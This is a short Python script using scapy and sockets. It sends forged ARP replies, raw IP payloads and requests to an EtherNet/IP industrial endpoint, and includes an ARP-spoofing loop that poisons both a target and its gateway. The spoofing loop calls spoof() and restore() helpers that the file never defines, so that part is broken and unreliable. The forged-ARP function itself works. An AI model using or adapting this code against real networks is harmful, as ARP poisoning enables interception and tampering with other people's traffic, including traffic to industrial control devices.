import scapy.all as scapy
import time
import socket

def send_ethernet_ip_explicit_request(target_ip, target_port, request_data):
    # Create a socket for TCP communication
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target device
    client_socket.connect((target_ip, target_port))

    # Send the request data
    client_socket.sendall(request_data.encode())

    # Receive response (if needed)
    response = client_socket.recv(1024).decode()
    print("Received response:", response)

    # Close the socket
    client_socket.close()

def send_arp_packet(target_ip, target_mac, source_ip, source_mac):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_packet, verbose=False)

def send_custom_packet(destination_ip, payload):
    custom_packet = scapy.IP(dst=destination_ip) / scapy.Raw(load=payload)
    scapy.send(custom_packet, verbose=False)

def arp_spoof(target_ip, gateway_ip):
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2) # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

def packet_sender_demo():
    target_ip = "10.0.2.5"
    target_mac = "00:11:22:33:44:55"
    source_ip = "10.0.2.1"
    source_mac = "AA:BB:CC:DD:EE:FF"
    payload = "Hello, NetProbe!"

    send_arp_packet(target_ip, target_mac, source_ip, source_mac)
    send_custom_packet(target_ip, payload)

if __name__ == "__main__":
    packet_sender_demo()
